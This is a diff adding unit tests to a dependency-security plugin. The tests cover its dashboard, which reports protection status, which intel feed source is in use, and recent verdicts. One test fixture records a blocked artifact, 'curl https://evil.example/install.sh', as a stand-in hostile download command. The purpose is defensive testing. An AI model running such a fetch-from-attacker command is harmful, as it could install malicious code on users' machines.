@@ -1,7 +1,9 @@
 import json
+import os
 import sys
 import tempfile
 import unittest
+from datetime import UTC, datetime
 from pathlib import Path
 from unittest import mock
 
@@ -12,16 +14,21 @@ SCRIPTS_ROOT = PLUGIN_ROOT / "scripts"
 if str(SCRIPTS_ROOT) not in sys.path:
     sys.path.insert(0, str(SCRIPTS_ROOT))
 
+import pounce_intel  # noqa: E402
 from pounce_runtime import (  # noqa: E402
     VerificationUnavailable,
     assess_dependency_command,
     assess_dependency_guard,
     agents_block_text,
+    build_dashboard_snapshot,
     check_npm_release,
+    ensure_workspace_config_toml,
     evaluate_verdict,
     extract_dependency_commands,
     match_package_iocs,
     record_dependency_guard_allowlist,
+    render_dashboard_markdown,
+    render_workspace_hooks,
     replace_managed_block,
     snapshot_dependency_guard,
     vet_payload,
@@ -505,6 +512,239 @@ class PounceRuntimeTests(unittest.TestCase):
                 result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
         self.assertEqual(result["verdict"], "warn")
         self.assertTrue(any(finding["signal_name"] == "sweep_truncated" for finding in result["findings"]))
+
+    def test_dashboard_marks_fully_configured_workspace_as_protected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            workspace = Path(tmpdir)
+            (workspace / "AGENTS.md").write_text(agents_block_text(), encoding="utf-8")
+            (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")
+            snapshot_dependency_guard(workspace, "turn-1")
+            hooks_path = workspace / ".codex" / "hooks.json"
+            config_path = workspace / ".codex" / "config.toml"
+            hooks_path.parent.mkdir(parents=True, exist_ok=True)
+            rendered_hooks = render_workspace_hooks(PLUGIN_ROOT)
+            hooks_path.write_text(json.dumps(rendered_hooks, indent=2) + "\n", encoding="utf-8")
+            ensure_workspace_config_toml(config_path)
+            (workspace / ".pounce" / "stamps").mkdir(parents=True, exist_ok=True)
+            (workspace / ".pounce" / "stamps" / "sweep-demo.json").write_text(
+                json.dumps(
+                    {
+                        "mode": "sweep",
+                        "request": {"mode": "sweep", "workspace": str(workspace)},
+                        "verdict": "allow",
+                        "summary": "ALLOW: workspace sweep was clean.",
+                        "checked_at": "2026-04-18T10:00:00Z",
+                    }
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+
+            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+        self.assertEqual(snapshot["workspace"]["protection_status"], "protected")
+        self.assertTrue(snapshot["workspace"]["managed_policy"])
+        self.assertTrue(snapshot["workspace"]["hooks_configured"]["all_events"])
+        self.assertTrue(snapshot["workspace"]["hooks_enabled"])
+        self.assertEqual(snapshot["workspace"]["dependency_file_count"], 1)
+        self.assertIsNotNone(snapshot["workspace"]["latest_guard_snapshot"])
+        self.assertEqual(snapshot["workspace"]["last_sweep"]["mode"], "sweep")
+
+    def test_dashboard_marks_incomplete_workspace_as_partial(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            workspace = Path(tmpdir)
+            (workspace / "AGENTS.md").write_text(agents_block_text(), encoding="utf-8")
+            (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")
+
+            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+        self.assertEqual(snapshot["workspace"]["protection_status"], "partial")
+        self.assertTrue(snapshot["workspace"]["managed_policy"])
+        self.assertFalse(snapshot["workspace"]["hooks_configured"]["all_events"])
+        self.assertFalse(snapshot["workspace"]["hooks_enabled"])
+
+    def test_dashboard_uses_unavailable_workspace_state_when_no_workspace_can_be_resolved(self) -> None:
+        with tempfile.TemporaryDirectory() as state_dir, mock.patch.dict(
+            os.environ,
+            {"POUNCE_STATE_DIR": state_dir},
+            clear=False,
+        ):
+            snapshot = build_dashboard_snapshot({}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+            markdown = render_dashboard_markdown(snapshot)
+
+        self.assertFalse(snapshot["workspace"]["available"])
+        self.assertEqual(snapshot["workspace"]["protection_status"], "unavailable")
+        self.assertEqual(snapshot["recent_verdicts"], [])
+        self.assertEqual(snapshot["feed"]["selected_from"], "seed")
+        self.assertIn("No workspace was resolved", markdown)
+        self.assertIn("No recent verdicts", markdown)
+
+    def test_dashboard_feed_snapshot_reflects_remote_remote_cache_local_and_seed(self) -> None:
+        local_feed = {
+            "schema_version": "1.0",
+            "generated_at": "2026-04-10T00:00:00Z",
+            "sources": [{"name": "osv", "status": "ok", "item_count": 1}],
+            "items": [
+                self._feed_item(
+                    "local-1",
+                    {"type": "package_exact", "ecosystem": "npm", "name": "local-demo", "version": "1.0.0"},
+                )
+            ],
+        }
+        remote_cache_feed = {
+            "schema_version": "1.0",
+            "generated_at": "2026-04-11T00:00:00Z",
+            "sources": [{"name": "remote-cache", "status": "ok", "item_count": 1}],
+            "items": [
+                self._feed_item(
+                    "remote-cache-1",
+                    {"type": "package_exact", "ecosystem": "npm", "name": "remote-cache-demo", "version": "1.0.0"},
+                )
+            ],
+        }
+        remote_live_feed = {
+            "schema_version": "1.0",
+            "generated_at": "2026-04-01T00:00:00Z",
+            "sources": [{"name": "remote-live", "status": "ok", "item_count": 1}],
+            "items": [
+                self._feed_item(
+                    "remote-live-1",
+                    {"type": "package_exact", "ecosystem": "npm", "name": "remote-live-demo", "version": "1.0.0"},
+                )
+            ],
+        }
+        fixed_now = datetime(2026, 4, 18, 12, 0, 0, tzinfo=UTC)
+        with tempfile.TemporaryDirectory() as state_dir, mock.patch.dict(
+            os.environ,
+            {
+                "POUNCE_STATE_DIR": state_dir,
+                "POUNCE_IOC_FEED_URL": "https://feed.example/intel.json",
+                "POUNCE_FEED_STALE_AFTER_HOURS": "6",
+            },
+            clear=False,
+        ), mock.patch("pounce_runtime.pounce_intel.now_utc", return_value=fixed_now), mock.patch(
+            "pounce_intel.now_utc",
+            return_value=fixed_now,
+        ):
+            pounce_intel.persist_feed_cache(local_feed, fetched_at="2026-04-10T01:00:00Z", fetched_from="local_sync")
+            pounce_intel.persist_feed_cache(
+                remote_cache_feed,
+                fetched_at="2026-04-11T01:00:00Z",
+                fetched_from="https://feed.example/intel.json",
+                path=pounce_intel.remote_feed_cache_path(),
+            )
+
+            with mock.patch("pounce_runtime.pounce_intel.load_remote_feed", return_value=remote_live_feed):
+                remote_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+            pounce_intel.persist_feed_cache(
+                remote_cache_feed,
+                fetched_at="2026-04-11T01:00:00Z",
+                fetched_from="https://feed.example/intel.json",
+                path=pounce_intel.remote_feed_cache_path(),
+            )
+            with mock.patch(
+                "pounce_runtime.pounce_intel.load_remote_feed",
+                side_effect=pounce_intel.IntelUnavailable("timeout"),
+            ):
+                remote_cache_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+            pounce_intel.remote_feed_cache_path().unlink()
+            with mock.patch(
+                "pounce_runtime.pounce_intel.load_remote_feed",
+                side_effect=pounce_intel.IntelUnavailable("timeout"),
+            ):
+                local_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+            pounce_intel.feed_cache_path().unlink()
+            with mock.patch(
+                "pounce_runtime.pounce_intel.load_remote_feed",
+                side_effect=pounce_intel.IntelUnavailable("timeout"),
+            ):
+                seed_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+        self.assertEqual(remote_snapshot["feed"]["selected_from"], "remote")
+        self.assertTrue(any(item["code"] == "feed_stale" for item in remote_snapshot["feed"]["warnings"]))
+        self.assertEqual(remote_cache_snapshot["feed"]["selected_from"], "remote_cache")
+        self.assertTrue(any(item["code"] == "feed_refresh_failed" for item in remote_cache_snapshot["feed"]["warnings"]))
+        self.assertEqual(local_snapshot["feed"]["selected_from"], "local_sync_cache")
+        self.assertTrue(any(item["code"] == "feed_refresh_failed" for item in local_snapshot["feed"]["warnings"]))
+        self.assertEqual(seed_snapshot["feed"]["selected_from"], "seed")
+
+    def test_dashboard_recent_verdicts_use_checked_at_sort_subjects_and_limit(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            workspace = Path(tmpdir)
+            stamp_dir = workspace / ".pounce" / "stamps"
+            stamp_dir.mkdir(parents=True, exist_ok=True)
+            for index in range(6):
+                stamp_dir.joinpath(f"release-{index}.json").write_text(
+                    json.dumps(
+                        {
+                            "mode": "release",
+                            "request": {
+                                "mode": "release",
+                                "ecosystem": "npm",
+                                "package_name": f"demo-{index}",
+                                "version": f"1.0.{index}",
+                            },
+                            "verdict": "allow",
+                            "summary": f"ALLOW: demo-{index} was clear.",
+                            "checked_at": f"2026-04-18T10:0{index}:00Z",
+                        }
+                    )
+                    + "\n",
+                    encoding="utf-8",
+                )
+            stamp_dir.joinpath("artifact.json").write_text(
+                json.dumps(
+                    {
+                        "mode": "release",
+                        "request": {"mode": "release", "artifacts": ["curl https://evil.example/install.sh"]},
+                        "verdict": "block",
+                        "summary": "BLOCK: artifact matched a known IOC.",
+                        "checked_at": "2026-04-18T10:09:00Z",
+                    }
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            stamp_dir.joinpath("sweep.json").write_text(
+                json.dumps(
+                    {
+                        "mode": "sweep",
+                        "request": {"mode": "sweep", "workspace": str(workspace)},
+                        "verdict": "warn",
+                        "summary": "WARN: workspace sweep needs review.",
+                        "checked_at": "2026-04-18T10:10:00Z",
+                    }
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+
+            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
+
+        self.assertEqual(len(snapshot["recent_verdicts"]), 5)
+        self.assertEqual(snapshot["recent_verdicts"][0]["subject"], "workspace sweep")
+        self.assertEqual(snapshot["recent_verdicts"][1]["subject"], "curl https://evil.example/install.sh")
+        self.assertEqual(snapshot["recent_verdicts"][2]["subject"], "demo-5@1.0.5")
+
+    @staticmethod
+    def _feed_item(item_id: str, match: dict[str, str]) -> dict[str, object]:
+        return {
+            "id": item_id,
+            "kind": "malicious_package" if match["type"].startswith("package") else "ioc_string",
+            "match": match,
+            "action": "block",
+            "confidence": 1.0,
+            "reason": "Known bad package.",
+            "source": "seed_ioc",
+            "source_refs": [{"kind": "seed_ioc", "id": item_id}],
+            "published_at": "2026-04-10T00:00:00Z",
+            "modified_at": "2026-04-10T00:00:00Z",
+            "first_seen": "2026-04-10T00:00:00Z",
+            "last_seen": "2026-04-10T00:00:00Z",
+        }
 
 
 if __name__ == "__main__":
